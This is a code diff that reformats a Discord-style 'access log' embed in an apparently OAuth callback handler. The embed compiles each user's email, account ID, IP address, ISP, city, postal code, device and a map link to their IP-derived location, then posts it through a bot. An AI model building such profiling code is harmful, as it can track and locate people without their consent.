@@ -166,22 +166,22 @@ def callback():
         ua = structured_data["user_agent"]
 
         embed_data = {
-            "title": "✅ 新しいアクセスログ",
-            "description": (
-                f"**名前:** {d['username']}#{d['discriminator']}\n"
-                f"**ID:** {d['id']}\n"
-                f"**メール:** {d['email']}\n"
-                f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n"
-                f"**IP:** {ip['ip']} / Proxy: {ip['proxy']} / Hosting: {ip['hosting']}\n"
-                f"**国:** {ip['country']} / {ip['region']} / {ip['city']} / {ip['zip']}\n"
-                f"**ISP:** {ip['isp']} / AS: {ip['as']}\n"
-                f"**UA:** {ua['raw']}\n"
-                f"**OS:** {ua['os']} / ブラウザ: {ua['browser']}\n"
-                f"**デバイス:** {ua['device']} / Bot判定: {ua['is_bot']}\n"
-                f"📍 [地図リンク](https://www.google.com/maps?q={ip['lat']},{ip['lon']})"
-            ),
-            "thumbnail": {"url": d["avatar_url"]}
-        }
+    "title": "✅ 新しいアクセスログ",
+    "description": (
+        f"**名前:** {d['username']}#{d['discriminator']}\n"
+        f"**ID:** {d['id']}\n"
+        f"**メール:** {d['email']}\n"
+        f"**Premium:** {d['premium_type']} / Locale: {d['locale']}\n\n"
+        f"**IP:** {ip['ip']} / Proxy: {ip['proxy']} / Hosting: {ip['hosting']}\n"
+        f"**国・県・市:** {ip['country']} / {ip['region']} / {ip['city']}\n"
+        f"**郵便番号:** {ip['zip']}\n"
+        f"**ISP / AS:** {ip['isp']} / {ip['as']}\n\n"
+        f"**OS / ブラウザ:** {ua['os']} / {ua['browser']}\n"
+        f"**デバイス:** {ua['device']} / Bot判定: {ua['is_bot']}\n"
+        f"📍 [地図リンク](https://www.google.com/maps?q={ip['lat']},{ip['lon']})"
+    ),
+    "thumbnail": {"url": d["avatar_url"]}
+}
 
         bot.loop.create_task(bot.send_log(embed=embed_data))
 
